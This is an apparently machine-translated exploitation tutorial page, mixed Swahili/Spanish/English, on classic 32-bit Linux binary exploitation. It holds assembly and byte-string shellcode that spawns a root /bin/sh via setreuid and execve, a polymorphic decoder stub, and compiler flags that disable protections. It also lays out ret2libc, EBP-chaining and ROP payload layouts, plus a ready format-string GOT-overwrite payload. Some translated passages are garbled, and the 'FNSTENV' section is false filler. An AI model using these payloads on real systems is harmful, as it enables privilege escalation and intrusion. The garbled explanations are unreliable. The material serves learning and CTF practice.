# Linux Exploiting (Msingi) (SPA)

## Linux Exploiting (Msingi) (SPA)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## **ASLR**

Aleatorizaci√≥n de direcciones

**Deactivate Global Address Space Layout Randomization (ASLR) (root)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
Reactivate Global Address Space Layout Randomization: echo 2 > /proc/sys/kernel/randomize\_va\_space

**Deactivate for a single execution** (no root required):\
setarch \`arch\` -R ./example arguments\
setarch \`uname -m\` -R ./example arguments

**Deactivate stack execution protection**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack example.c -o example

**Core file**\
ulimit -c unlimited\
gdb /exec core\_file\
/etc/security/limits.conf -> \* soft core unlimited

**Text**\
**Data**\
**BSS**\
**Heap**

**Stack**

**BSS Section**: Uninitialized global or static variables
```
static int i;
```
**Sehemu ya DATA**: Variables za kikoa au za kudumu zilizoanzishwa
```
int i = 5;
```
**Secci√≥n TEXT**: Maagizo ya nambari (opcodes)

**Secci√≥n HEAP**: Vizuizi vilivyohifadhiwa kwa njia ya kudumu (malloc(), calloc(), realloc() )

**Secci√≥n STACK**: Stack (Vigezo vilivyopitishwa, mnyororo wa mazingira (env), variables za ndani‚Ä¶)

## **1. STACK OVERFLOWS**

> Kujaa kwa kizuizi, kujaa kwa kizuizi, kujaa kwa stack, kuvunja stack

Kushindwa kwa kugawanyika au kukiuka kizuizi: Wakati jaribio linapofanywa kufikia anwani ya kumbukumbu ambayo haijatengwa kwa mchakato.

Ili kupata anwani ya kazi ndani ya programu, unaweza kufanya hivi:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Wito kwa sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Angalia kernel interrupts: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; safisha eax\
xor ebx, ebx ; ebx = 0 kwa sababu hakuna hoja ya kupeleka\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Tekeleza syscall

**nasm -f elf assembly.asm** ‚Äî> Inarudi .o\
**ld assembly.o -o shellcodeout** ‚Äî> Inatoa faili ya kutekelezwa iliyoundwa na msimbo wa assembler na tunaweza kupata opcodes na **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Ili kuona kwamba ni shellcode yetu na kupata OpCodes

**Angalia ikiwa shellcode inafanya kazi**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Kuona kwamba wito wa mfumo unafanywa kwa usahihi, programu iliyopita inapaswa kuchapishwa na wito wa mfumo unapaswa kuonekana kwenye **strace ./PROGRAMA\_COMPILADO**

Wakati wa kuunda shellcodes, unaweza kutumia hila. Maagizo ya kwanza ni kuruka kwa wito. Wito unaita msimbo wa asili na pia huingiza EIP kwenye stack. Baada ya maagizo ya wito, tumeweka herufi tunayohitaji, kwa hivyo na EIP hiyo tunaweza kuashiria herufi na kuendelea kutekeleza msimbo.

EJ **HILA (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**Kutumia Stack (/bin/sh):**

Kutumia Stack (/bin/sh) ni mbinu ya kawaida ya kudhibiti mfumo wa Linux kupitia kuingiza msimbo wa Shell (/bin/sh) kwenye Stack. Hii inaweza kufanyika kwa kutumia shida katika programu au huduma ambayo inaruhusu uingizaji wa data isiyo salama kwenye Stack.

Mchakato wa kutumia Stack (/bin/sh) unahusisha hatua zifuatazo:

1. Kuchunguza shida: Kwanza, unahitaji kutafiti programu au huduma ili kugundua shida ambayo inaruhusu uingizaji wa data isiyo salama kwenye Stack.

2. Kupata nafasi ya kurejesha udhibiti: Mara baada ya kugundua shida, unahitaji kutumia mbinu kama vile kuzidi kikomo cha ukubwa wa uingizaji wa data au kubadilisha anwani ya kurudi ili kupata nafasi ya kurejesha udhibiti wa programu au huduma.

3. Kuandaa msimbo wa Shell: Baada ya kupata nafasi ya kurejesha udhibiti, unahitaji kuandaa msimbo wa Shell (/bin/sh) ambao utatekelezwa kwenye mfumo wa lengo. Msimbo huu unaweza kutumika kufanya vitendo mbalimbali, kama vile kupata ufikiaji wa kiwango cha juu, kubadilisha mazingira ya mfumo, au kutekeleza amri zingine za Shell.

4. Kuingiza msimbo wa Shell kwenye Stack: Hatimaye, unahitaji kuingiza msimbo wa Shell (/bin/sh) kwenye Stack kwa kutumia shida uliyopata hapo awali. Hii itasababisha mfumo wa lengo kutekeleza msimbo wa Shell na kukupa udhibiti kamili wa mfumo.

Ni muhimu kuelewa kuwa kutumia Stack (/bin/sh) ni mbinu ya kuvunja sheria na inapaswa kutumiwa tu kwa madhumuni ya kujifunza au kwa idhini ya mmiliki wa mfumo unaolengwa. Matumizi yoyote mabaya ya mbinu hii yanaweza kusababisha madhara makubwa na kukiuka sheria za kisheria.
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**

EJ FNSTENV ni mbinu ya kudukua inayotumika kuchunguza na kuchukua udhibiti wa mazingira ya kutekeleza programu kwenye mifumo ya Linux. Mbinu hii hutumia kosa la usalama katika mazingira ya kutekeleza programu ili kufanikisha kuingia kwenye mfumo na kupata udhibiti kamili.

Mbinu hii inategemea kuchanganya mazingira ya kutekeleza programu na kusababisha kosa la usalama linaloruhusu mtu mwingine kuingilia kati na kuchukua udhibiti. Kwa kufanya hivyo, mtu anaweza kutekeleza amri zao wenyewe na kupata ufikiaji usioidhinishwa kwenye mfumo.

Kwa kufanikisha EJ FNSTENV, ni muhimu kuelewa jinsi mazingira ya kutekeleza programu yanavyofanya kazi na jinsi ya kutumia kosa la usalama lililopo. Kwa kufanya uchunguzi wa kina na kuelewa mazingira ya kutekeleza programu, unaweza kutumia mbinu hii kudukua mifumo ya Linux na kupata udhibiti kamili.
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Mwindaji wa Yai:**

Inahusisha nambari ndogo ambayo inatafuta kurasa za kumbukumbu zinazohusiana na mchakato ili kutafuta shellcode iliyohifadhiwa hapo (inatafuta saini fulani iliyoingizwa kwenye shellcode). Inafaa katika hali ambapo kuna nafasi ndogo tu ya kuingiza nambari.

**Shellcodes Polymorphic**

Hizi ni shellcodes zilizofichwa ambazo zina nambari ndogo za kuzifichua na kuzitumia, kwa kutumia mbinu ya Call-Pop hii ni **mfano wa kificho kilichofichwa kwa kusonga**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
1. **Kushambulia Frame Pointer (EBP)**

Inatumika katika hali ambapo tunaweza kubadilisha EBP lakini sio EIP.

Inajulikana kwamba wakati wa kutoka kwenye kazi, kanuni ifuatayo ya assembler inatekelezwa:
```
movl               %ebp, %esp
popl                %ebp
ret
```
Kwa njia hii, ni iwezekanavyo kubadilisha EBP wakati wa kutoka kwa kazi (fvuln) ambayo imeitwa na kazi nyingine, wakati kazi iliyoitwa na fvuln inapomalizika, EIP yake inaweza kubadilishwa.

Katika fvuln, unaweza kuingiza EBP bandia inayoelekeza mahali ambapo anwani ya shellcode + 4 iko (unahitaji kuongeza 4 kwa sababu ya pop). Kwa njia hii, wakati wa kutoka kwa kazi, thamani ya &(\&Shellcode)+4 itawekwa kwenye ESP, na pop itapunguza 4 kutoka ESP na kuielekeza kwenye anwani ya shellcode wakati ret inatekelezwa.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + kujaza + &(\&Shellcode)+4

**Exploit ya Off-by-One**\
Inaruhusiwa kubadilisha tu byte ya chini zaidi ya EBP. Unaweza kutekeleza shambulio kama hapo juu lakini kumbukumbu ambayo inashikilia anwani ya shellcode lazima iwe na byte 3 za kwanza sawa na EBP.

## **4. Njia za Return to Libc**

Njia hii ni muhimu wakati stack haiwezi kutekelezwa au ina nafasi ndogo sana ya kubadilishwa.

ASLR inasababisha kazi kila wakati kubebwa kwenye nafasi tofauti za kumbukumbu kila wakati inapotekelezwa. Kwa hivyo, njia hii inaweza kutofaulu katika kesi hiyo. Kwa seva za mbali, kwa kuwa programu inatekelezwa mara kwa mara kwenye anwani ile ile, inaweza kuwa na manufaa.

* **cdecl(C declaration)** Inaweka hoja kwenye stack na baada ya kutoka kwa kazi, inasafisha stack
* **stdcall(standard call)** Inaweka hoja kwenye stack na ni kazi iliyoitwa ambayo inasafisha stack
* **fastcall** Inaweka hoja mbili za kwanza kwenye rejista na zingine kwenye stack

Unaweka anwani ya maelekezo ya mfumo ya libc na unapitisha "string" /bin/sh "kama hoja, kawaida kutoka kwa mazingira ya kubadilika. Kwa kuongezea, unatumia anwani ya kazi ya exit ili mara tu shell haifai tena, programu itatoka bila shida (na kuandika magogo).

**export SHELL=/bin/sh**

Ili kupata anwani zinazohitajika, unaweza kutazama ndani ya **GDB:**\
**p system**\
**p exit**\
**rabin2 -i executable** ‚Äî> Inatoa anwani ya kila kazi ambayo programu inatumia wakati inapobebwa\
(Ndani ya kuanza au kuvunja): **x/500s $esp** ‚Äî> Tunatafuta hapa string /bin/sh

Baada ya kupata anwani hizi, **exploit** itakuwa:

"A" \* UMBALIZI EBP + 4 (EBP: inaweza kuwa "A" 4 ingawa bora ikiwa ni EBP halisi ili kuepuka makosa ya segfault) + Anwani ya **system** (itafunika EIP) + Anwani ya **exit** (baada ya kutekeleza system("/bin/sh"), kazi hii itaitwa kwa sababu ya byte ya kwanza 4 ya stack inachukuliwa kama anwani inayofuata ya EIP ya kutekelezwa) + Anwani ya "**/bin/sh**" (itakuwa hoja iliyopitishwa kwa mfumo)

Kwa njia hii, EIP itafunikwa na anwani ya mfumo ambayo itapokea "string" /bin/sh "kama hoja na baada ya kutoka kwa hii, itatekeleza kazi ya exit().

Inawezekana kukutana na hali ambapo byte fulani ya anwani ya kazi fulani ni sifuri au nafasi (\x20). Katika kesi hiyo, unaweza kuchambua anwani zilizotangulia kwa kazi hiyo kwa sababu kuna uwezekano wa kuwa na NOPs kadhaa ambazo zinaweza kuturuhusu kuita moja yao badala ya kazi moja kwa moja (kwa mfano na > x/8i system-4).

Njia hii inafanya kazi kwa sababu kuita kazi kama mfumo kwa kutumia opcode **ret** badala ya **call**, kazi inaelewa kuwa byte za kwanza 4 zitakuwa anwani ya **EIP** ya kurudi.

Mbinu ya kuvutia na njia hii ni kuita **strncpy()** kuhamisha mzigo kutoka kwenye stack hadi kwenye heap na kisha kutumia **gets()** kutekeleza mzigo huo.

Mbinu nyingine ya kuvutia ni matumizi ya **mprotect()** ambayo inaruhusu kuweka ruhusa zinazohitajika kwa sehemu yoyote ya kumbukumbu. Inafanya kazi au ilifanya kazi kwenye BDS, MacOS, na OpenBSD, lakini sio kwenye linux (inadhibiti kuweza kutoa ruhusa za kuandika na kutekeleza wakati huo huo). Shambulio hili linaweza kutumika kurejesha stack kama inayoweza kutekelezwa.

**Unganisha kazi**

Kwa kutegemea mbinu iliyotangulia, njia hii ya shambulio inajumuisha:\
Kujaza + \&Function1 + \&pop;ret; + \&arg\_fun1 + \&Function2 + \&pop;ret; + \&arg\_fun2 + ...

Kwa njia hii, unaweza kuunganisha kazi ambazo unataka kuita. Kwa kuongezea, ikiwa unataka kutumia kazi na hoja nyingi, unaweza kuweka hoja zinazohitajika (kwa mfano 4) na kuweka hoja 4 na kutafuta anwani kwenye eneo na opcodes: pop, pop, pop, pop, ret ‚Äî> **objdump -d executable**

**Unganisha kwa kutumia uongo wa fremu (unganisha EBPs)**

Inahusisha kutumia uwezo wa kubadilisha EBP kuunganisha utekelezaji wa kazi kadhaa kupitia EBP na "leave;ret"

Kujaza

* Weka EBP bandia ambayo inaelekeza kwa: 2nd EBP\_fake + kazi ya kutekelezwa: (\&system() + \&leave;ret + &"/bin/sh")
* Weka anwani ya kazi &(leave;ret) kama anwani ya EIP

Anza shellcode na anwani ya sehemu inayofuata ya shellcode, kwa mfano: 2nd EBP\_fake + \&system() + &(leave;ret;) + &"/bin/sh"

2nd EBP itakuwa: 3rd EBP\_fake + \&system() + &(leave;ret;) + &"/bin/ls"

Shellcode hii inaweza kurudiwa mara kwa mara kwenye sehemu za kumbukumbu ambazo unaweza kufikia ili kupata shellcode inayoweza kugawanywa kwa urahisi kwa vipande vidogo vya kumbukumbu.

(Unganisha utekelezaji wa kazi kwa kuchanganya udhaifu wa EBP na ret2lib ulioonyeshwa hapo awali)

## **5. Njia za ziada**

**Ret2Ret**

Inafaa wakati huwezi kuweka anwani ya stack kwenye EIP (inathibitisha kuwa EIP hauna 0xbf) au wakati huwezi kuhesabu mahali pa shellcode. Walakini, kazi inayoweza kudhurika inakubali hoja (shellcode itakuwa hapa).

Kwa njia hii, kwa kubadilisha EIP na anwani ya **ret**, itapakia anwani inayofuata (ambayo ni anwani ya hoja ya kwanza ya kazi). Yaani, itapakia shellcode.

Exploit itakuwa: SHELLCODE + Kujaza (hadi EIP) + **\&ret** (byte zifuatazo za stack zinaelekeza kwenye mwanzo wa shellcode kwa sababu anwani ya hoja iliyopitishwa imeingizwa
```
**Ret2PopRet**
```
Ikiwa hatuna udhibiti juu ya hoja ya kwanza lakini tunayo udhibiti juu ya ya pili au ya tatu, tunaweza kubadilisha EIP na anwani ya pop-ret au pop-pop-ret, kulingana na tunayohitaji.

**Mbinu ya Murat**

Katika Linux, programu zote zinapangwa kuanzia 0xbfffffff.

Kwa kuangalia jinsi mchakato mpya unavyojengwa kwenye Linux, unaweza kuendeleza shambulio ili programu ianze katika mazingira ambayo ina variable pekee ya shellcode. Kisha anwani ya variable hii inaweza kuhesabiwa kama: addr = 0xbfffffff - 4 - strlen(NOMBRE_ejecutable_completo) - strlen(shellcode)

Kwa njia hii, anwani ambapo variable ya mazingira na shellcode iko inaweza kupatikana kwa urahisi.

Hii inawezekana kwa sababu kazi ya execle inaruhusu kuunda mazingira ambayo ina variable za mazingira tu zinazohitajika.

**Jump to ESP: Windows Style**

Kwa kuwa ESP inaonyesha mwanzo wa stack kila wakati, mbinu hii inahusisha kubadilisha EIP na anwani ya wito kwa **jmp esp** au **call esp**. Kwa njia hii, shellcode inahifadhiwa baada ya kubadilisha EIP kwa sababu baada ya kutekeleza **ret**, ESP itakuwa inaonyesha anwani inayofuata, ambapo shellcode imehifadhiwa.

Ikiwa ASLR haipo kwenye Windows au Linux, inawezekana kuita **jmp esp** au **call esp** zilizohifadhiwa kwenye kitu kinachoshirikiwa. Ikiwa ASLR iko, inaweza kutafutwa ndani ya programu yenyewe ambayo ina kasoro.

Mbali na hilo, uwezo wa kuweka shellcode baada ya kuharibu EIP badala ya katikati ya stack, inaruhusu maagizo ya push au pop ambayo yanatekelezwa katikati ya kazi kutofikia shellcode (ambayo inaweza kutokea ikiwa ingewekwa katikati ya stack ya kazi).

Kwa njia sawa na hii, ikiwa tunajua kwamba kazi inarudisha anwani ambapo shellcode imehifadhiwa, tunaweza kuita **call eax** au **jmp eax (ret2eax).**

**ROP (Return Oriented Programming) au vipande vya kodi vilivyokopwa**

Vipande vya kodi vinavyoitwa gadgets hutumiwa kutekeleza mbinu hii.

Mbinu hii inahusisha kuunganisha wito tofauti kwa kazi kwa kutumia mbinu ya **ret2libc** na matumizi ya **pop,ret**.

Katika baadhi ya muundo wa usindikaji, kila maagizo ni seti ya bits 32 (kama vile MIPS). Walakini, katika Intel, maagizo ni ya ukubwa tofauti na maagizo kadhaa yanaweza kushiriki seti moja ya bits, kwa mfano:

**movl $0xe4ff, -0x(%ebp)** ‚Äî> Ina bytes 0xffe4 ambayo pia inaweza kuwa sawa na: **jmp \*%esp**

Kwa njia hii, inawezekana kutekeleza baadhi ya maagizo ambayo hayapo kwenye programu asili.

**ROPgadget.py** inatusaidia kupata thamani katika faili za binary.

Programu hii pia inatumika kuunda **payloads**. Unaweza kumpa maktaba ambayo unataka kupata ROPs na itazalisha payload katika Python ambayo unaweza kumpa anwani ambapo maktaba hiyo iko na payload tayari kutumika kama shellcode. Kwa kuongezea, kwa kutumia wito wa mfumo, haitekelezi chochote kwenye stack lakini inaendelea kuhifadhi anwani za ROP ambazo zitatekelezwa kupitia **ret**. Ili kutumia payload hii, lazima uite payload kupitia maagizo ya **ret**.

**Integer overflows**

Aina hii ya overflows hutokea wakati variable haijatayarishwa kushughulikia nambari kubwa kama ile inayopitishwa, labda kutokana na kuchanganyikiwa kati ya variables na bila ishara, kwa mfano:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Katika mfano uliopita tunaona kuwa programu inatarajia vigezo 2. La kwanza ni urefu wa mnyororo unaofuata na la pili ni mnyororo wenyewe.

Ikiwa tunapitisha nambari hasi kama kigezo cha kwanza, itatokea kuwa len < 256 na tutapita kizuizi hicho, na pia strlen (buffer) itakuwa ndogo kuliko l, kwani l ni unsigned int na itakuwa kubwa sana.

Aina hii ya overflows haijaribu kuandika kitu katika mchakato wa programu, bali inajaribu kuvuka vichujio vilivyoundwa vibaya ili kudukua udhaifu mwingine.

**Variables zisizoanzishwa**

Haijulikani thamani ambayo inaweza kuchukua kwa kuzingatia kuwa variable haijaanzishwa na inaweza kuwa ya kuvutia kuiona. Inaweza kuchukua thamani ambayo variable ya kazi ya awali ilichukua na hii inaweza kudhibitiwa na mshambuliaji.

## **Format Strings**

Katika C **`printf`** ni kazi inayoweza kutumika kuchapisha mnyororo fulani. **Kigezo cha kwanza** kinachotarajiwa na kazi hii ni **maandishi safi na formatters**. **Vigezo vinavyofuata** vinavyotarajiwa ni **thamani** za **kubadilisha** formatters kutoka kwenye maandishi safi.

Udhaifu unaonekana wakati **mshambuliaji anaweka maandishi yake kama hoja ya kwanza** kwa kazi hii. Mshambuliaji ataweza kuunda **kuingiza maalum kwa kudhuru** uwezo wa **mpangilio wa printf** ili **kuandika data yoyote kwenye anwani yoyote**. Kwa njia hii, anaweza **kutekeleza nambari yoyote**.

Fomatters:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **inahifadhi** **idadi ya herufi zilizoandikwa** katika **anwani iliyotajwa. Kuandika** idadi **ya herufi** sawa na nambari ya hex tunayohitaji kuandika ndiyo njia ya **kuandika data yoyote**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

Hii ni jedwali ambalo lina **anwani** za **kazi za nje** zinazotumiwa na programu.

Pata anwani ya jedwali hili na: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Tazama jinsi baada ya **kupakia** **programu** katika GEF unaweza **kuona** **kazi** zilizo katika **GOT**: `gef‚û§ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

Kwa kutumia GEF unaweza **kuanza** kikao cha **kudebugi** na kutekeleza **`got`** kuona jedwali la got:

![](<../../.gitbook/assets/image (621).png>)

Katika faili ya binary, GOT ina **anwani za kazi au** kwa **sehemu ya PLT** ambayo itapakia anwani ya kazi. Lengo la shambulio hili ni **kubadilisha kuingia kwa GOT** ya kazi ambayo itatekelezwa baadaye **na** anwani ya PLT ya kazi ya **`system`**. Kwa kawaida, utabadilisha GOT ya kazi ambayo itaitwa na parameta zinazodhibitiwa na wewe (hivyo utaweza kudhibiti parameta zinazotumwa kwa kazi ya mfumo).

Ikiwa **`system`** **haitumiwi** na script, kazi ya mfumo **haitakuwa na kuingia katika GOT**. Katika hali hii, utahitaji **kuvuja kwanza anwani** ya kazi ya `system`.

**Procedure Linkage Table** ni jedwali la **kusoma tu** katika faili ya ELF ambalo linahifadhi alama zote muhimu **zinazohitaji ufumbuzi**. Wakati moja ya kazi hizi inaitwa, GOT ita **rekebisha** **mtiririko** kwa PLT ili iweze **kutatua** anwani ya kazi na kuandika kwenye GOT. Kisha, **wakati ujao** wito unafanywa kwa anwani hiyo, kazi hiyo inaitwa moja kwa moja bila haja ya kuitatua.

Unaweza kuona anwani za PLT na **`objdump -j .plt -d ./vuln_binary`**

### **Mzunguko wa Shambulio**

Kama ilivyoelezwa hapo awali, lengo litakuwa **kubadilisha** **anwani** ya **kazi** katika jedwali la **GOT** ambayo itaitwa baadaye. Kwa kawaida unaweza kuweka **anwani ya shellcode** iliyoko katika sehemu ya kutekelezwa, lakini ni uwezekano mkubwa hutaweza kuandika shellcode katika sehemu ya kutekelezwa. Kwa hivyo chaguo lingine ni **kubadilisha** **kazi** ambayo **inapokea** **vigezo** vyake kutoka kwa **mtumiaji** na **kuielekeza** kwa **kazi ya `system`**.

Kuandika anwani, kawaida hatua 2 hufanywa: Kwanza unaweza **kuandika 2Bytes** za anwani na kisha nyingine 2. Kufanya hivyo, unatumia **`$hn`**.

**HOB** inaitwa kwa 2 byte za juu za anwani\
**LOB** inaitwa kwa 2 byte za chini za anwani

Kwa hivyo, kwa sababu ya jinsi format string inavyofanya kazi, unahitaji **kuandika kwanza ndogo zaidi** kati ya \[HOB, LOB] na kisha nyingine.

Ikiwa HOB < LOB\
`[anwani+2][anwani]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Ikiwa HOB > LOB\
`[anwani+2][anwani]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N¬∫Param\_dir\_HOB LOB\_shell-HOB\_shell N¬∫Param\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Kigezo cha Shambulio cha Format String**

Unaweza kupata **kigezo** cha kudukua GOT kwa kutumia format-strings hapa:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

Kimsingi hii ni muundo na **kazi ambazo zitaitwa** kabla ya programu kukamilika. Hii ni ya kuvutia ikiwa unaweza kuita **shellcode yako kwa kuruka kwenye anwani**, au katika hali ambapo unahitaji kurudi kwa main tena **kudukua format string mara ya pili**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Tafadhali kumbuka kuwa hii **haitasababisha** mzunguko wa milele kwa sababu unaporudi kwenye kuu, canary itagundua, mwisho wa stack unaweza kuharibiwa na kazi haitaitwa tena. Kwa hivyo, utaweza **kuwa na utekelezaji mwingine** wa vuln.

### **Format Strings kwa Kudumpisha Yaliyomo**

String ya muundo pia inaweza kutumiwa kudumpisha yaliyomo kutoka kwenye kumbukumbu ya programu. Kwa mfano, katika hali ifuatayo kuna **variable ya ndani kwenye stack inayoelekeza kwenye bendera**. Ikiwa **unapata** mahali ambapo **kumbukumbu** ya **pointer** kwa **bendera** iko, unaweza kufanya **printf kufikia** anwani hiyo na **kuchapisha** bendera:

Kwa hivyo, bendera iko kwenye **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Na kutoka kwa uvujaji unaweza kuona **pointer kwa bendera** iko kwenye **parameter ya 8**:

![](<../../.gitbook/assets/image (623).png>)

Kwa hivyo, **kufikia parameter ya 8** unaweza kupata bendera:

![](<../../.gitbook/assets/image (624).png>)

Tafadhali kumbuka kuwa kufuatia **udanganyifu uliopita** na kugundua kuwa unaweza **kuvuja yaliyomo**, unaweza **kuweka pointers** kwa **`printf`** kwenye sehemu ambapo **executable** ina **pakiwa** na **kudump** kabisa!

### **DTOR**

{% hint style="danger" %}
Leo ni **jambo la kawaida sana kupata binary na sehemu ya dtor**.
{% endhint %}

Destructor ni kazi ambazo **hutekelezwa kabla ya programu kukamilika**. Ikiwa unaweza **kuandika** anwani ya **shellcode** kwenye **`__DTOR_END__`**, hiyo itatekelezwa kabla ya programu kuisha. Pata anwani ya sehemu hii na:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Kawaida utapata sehemu ya **DTOR** **kati ya** thamani `ffffffff` na `00000000`. Kwa hivyo ikiwa tu unaona thamani hizo, inamaanisha kuwa **hakuna kazi iliyosajiliwa**. Kwa hivyo **badilisha** **`00000000`** na **anwani** ya **shellcode** ili kuitekeleza.

### **Formati za Nakala kwa Ujazo wa Buffers**

**sprintf inahamisha** nakala iliyopangwa **kwa** **variable.** Kwa hivyo, unaweza kutumia **mpangilio** wa nakala ili kusababisha **ujazo wa buffer kwenye variable** ambapo yaliyomo yanakopiwaa.\
Kwa mfano, mzigo wa `%.44xAAAA` utaandika 44B+"AAAA" kwenye variable, ambayo inaweza kusababisha ujazo wa buffer.

### **Miundo ya \_\_atexit**

{% hint style="danger" %}
Leo ni nadra sana **kutumia hii**.
{% endhint %}

**`atexit()`** ni kazi ambayo **kazi zingine zinapitishwa kama parameta.** Hizi **kazi** zitatolewa **wakati wa kutekeleza** **`exit()`** au **kurudi** kwa **main**.\
Ikiwa unaweza **kubadilisha** **anwani** ya moja ya hizi **kazi** ili ielekee kwenye shellcode kwa mfano, utapata **udhibiti** wa **mchakato**, lakini hii ni ngumu zaidi kwa sasa.\
